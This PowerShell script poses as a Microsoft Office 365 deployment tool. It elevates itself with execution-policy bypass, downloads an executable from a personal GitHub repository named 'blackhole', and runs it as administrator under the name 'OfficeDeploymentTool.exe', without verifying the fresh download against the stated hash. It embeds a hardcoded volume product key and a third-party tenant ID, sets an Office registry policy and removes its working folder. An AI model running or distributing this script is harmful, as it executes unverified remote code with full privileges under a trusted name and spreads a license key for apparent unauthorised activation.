function Test-Administrator {
    $currentIdentity = [Security.Principal.WindowsIdentity]::GetCurrent()
    $principal = New-Object Security.Principal.WindowsPrincipal($currentIdentity)
    return $principal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
}
if (-Not (Test-Administrator)) {
    $scriptPath = $MyInvocation.MyCommand.Path
    Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"" -Verb RunAs
    exit
}
$folderName = "Microsoft Office 365 Deployment"
$tempDir = [System.IO.Path]::GetTempPath()
$directory = Join-Path -Path $tempDir -ChildPath $folderName
$odtUrl = "https://raw.githubusercontent.com/almaheras/blackhole/refs/heads/main/setup.exe"
$configFileName = "Configuration.xml"
$configPath = Join-Path -Path $directory -ChildPath $configFileName
$expectedHash = "9530c6156cf8aba25e660b94666158f34ce54c2269af4727486c34b7ac5fb159ec711c9ee98ba5fda673fd29da3204111df52445d64ca5aca077ece79364dd61"
function Get-FileHashValue {
    param([string]$FilePath)
    if (Test-Path $FilePath) {
        $hash = Get-FileHash -Path $FilePath -Algorithm SHA512
        return $hash.Hash
    }
    return $null
}
if (!(Test-Path -Path $directory)) {
    New-Item -ItemType Directory -Path $directory
}
$odtPath = Join-Path -Path $directory -ChildPath "OfficeDeploymentTool.exe"
$shouldDownload = $true
if (Test-Path $odtPath) {
    $fileHash = Get-FileHashValue -FilePath $odtPath
    if ($fileHash -eq $expectedHash) {
        $shouldDownload = $false
    }
}
if ($shouldDownload) {
    try {
        Invoke-WebRequest -Uri $odtUrl -OutFile $odtPath -ErrorAction Stop
    } catch {
        exit
    }
}
if (-Not (Test-Path $odtPath) -or (Get-Item $odtPath).Extension -ne ".exe") {
    exit
}
$configContent = @"
<Configuration ID="bb0cf90b-e9b1-4351-90ac-e3a71d34f0b3">
  <Info Description="All licensed products under this subscription account are centrally managed and maintained by Almahera. Users are advised to utilize these services responsibly, adhering to the organization's guidelines and ensuring compliance with all applicable usage policies." />
  <Add OfficeClientEdition="64" Channel="CurrentPreview">
    <Product ID="O365ProPlusRetail">
      <Language ID="id-id" />
      <Language ID="MatchOS" />
      <Language ID="en-us" />
      <ExcludeApp ID="Groove" />
      <ExcludeApp ID="Lync" />
      <ExcludeApp ID="OutlookForWindows" />
    </Product>
    <Product ID="VisioProRetail">
      <Language ID="id-id" />
      <Language ID="MatchOS" />
      <Language ID="en-us" />
      <ExcludeApp ID="Groove" />
      <ExcludeApp ID="Lync" />
      <ExcludeApp ID="OutlookForWindows" />
    </Product>
    <Product ID="ProjectPro2024Volume" PIDKEY="FQQ23-N4YCY-73HQ3-FM9WC-76HF4">
      <Language ID="id-id" />
      <Language ID="MatchOS" />
      <Language ID="en-us" />
      <ExcludeApp ID="Groove" />
      <ExcludeApp ID="Lync" />
      <ExcludeApp ID="OutlookForWindows" />
    </Product>
    <Product ID="AccessRuntimeRetail">
      <Language ID="id-id" />
      <Language ID="MatchOS" />
      <Language ID="en-us" />
    </Product>
    <Product ID="ProofingTools">
      <Language ID="en-us" />
      <Language ID="id-id" />
    </Product>
  </Add>
  <Property Name="SharedComputerLicensing" Value="0" />
  <Property Name="FORCEAPPSHUTDOWN" Value="TRUE" />
  <Property Name="DeviceBasedLicensing" Value="0" />
  <Property Name="SCLCacheOverride" Value="0" />
  <Property Name="TenantId" Value="bd03d74d-3de5-4fd3-9815-1f25618f5186" />
  <Property Name="AUTOACTIVATE" Value="1" />
  <Updates Enabled="TRUE" />
  <AppSettings>
    <Setup Name="Company" Value="Almahera" />
  </AppSettings>
  <Display Level="Full" AcceptEULA="TRUE" />
</Configuration>
"@
$configContent | Out-File -FilePath $configPath -Encoding UTF8
try {
    Start-Process -FilePath $odtPath -ArgumentList "/configure $configPath" -Wait
    reg add "HKCU\Software\Policies\Microsoft\Office\16.0\Common" /v insiderslabbehavior /t REG_DWORD /d 1
} catch {
}
try {
    Remove-Item -Path $directory -Recurse -Force
} catch {
}
